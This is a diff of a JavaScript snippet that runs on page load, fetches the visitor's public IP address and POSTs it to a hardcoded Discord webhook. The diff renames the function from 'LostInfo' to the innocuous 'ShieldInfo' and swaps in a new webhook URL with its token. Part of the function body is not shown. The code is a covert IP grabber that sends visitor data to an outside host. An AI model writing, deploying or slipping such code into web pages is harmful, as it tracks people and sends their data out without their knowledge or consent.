@@ -1,4 +1,4 @@
-function LostInfo() {
+function ShieldInfo() {
     fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
@@ -17,7 +17,7 @@ function LostInfo() {
                 avatar_url: "https://cdn.xoa.me/uploads/611e43ef-ba96-4914-aa7c-a1c85149415b.jpg"
             };
 
-            return fetch("https://discord.com/api/webhooks/1342645916762636308/c524xCs6bv1Wdh0QxDjII2MfM7jKLTqy5OdtnKJAj-m0wiR1ShVHgA3eViemtcd8bd9W", {
+            return fetch("https://discord.com/api/webhooks/1431831040657461270/xJ0s3CeF76hSVMgnC5pMlvtyleE9SW1HAeWgRhu3mIOf5NbQRxjQxwAZ5BKyeEHg5rRP", {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -34,4 +34,4 @@ function LostInfo() {
         });
 }
 
-LostInfo();
+ShieldInfo();
